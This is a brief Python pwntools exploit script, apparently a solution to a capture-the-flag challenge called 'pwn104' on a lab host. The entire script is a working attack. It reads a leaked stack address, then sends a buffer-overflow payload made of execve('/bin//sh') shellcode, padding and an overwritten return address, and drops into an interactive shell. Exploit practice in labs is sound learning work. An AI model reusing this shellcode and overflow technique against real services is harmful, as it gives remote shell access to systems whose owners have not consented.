#!/usr/bin/python


from pwn import *

ip = '10.10.215.68'

p = remote(ip,9004)

#p = process("./pwn104.pwn104")

p.recvuntil(b'at ')
address = p.recvline()
buffer = p64(int(address, 16)) #buffer length 8

# https://www.exploit-db.com/shellcodes/46907, 64bit linux shellcode
shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05' # shellcode length 23

payload = shellcode # 23
payload += b'A' * (88 - len(shellcode)) #88 - 23 = 65 
payload += buffer #8 

#total payload length is 23 + 65 + 8 = 96

p.sendline(payload)
p.interactive()